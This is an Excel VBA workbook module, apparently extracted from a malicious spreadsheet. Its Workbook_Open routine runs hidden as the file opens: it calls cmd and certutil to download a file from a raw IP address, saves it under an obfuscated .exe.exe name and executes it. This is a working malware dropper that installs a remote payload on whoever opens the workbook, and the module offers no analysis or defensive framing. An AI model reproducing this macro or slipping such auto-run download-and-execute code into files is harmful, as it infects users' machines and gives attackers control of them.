Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
PID = Shell("cmd /c certutil.exe -urlcache -split -f ""http://52.59.234.180/class/ten/65087710033.bat"" Grfciafhjqghqqtyyb.exe.exe && Grfciafhjqghqqtyyb.exe.exe", vbHide)
End Sub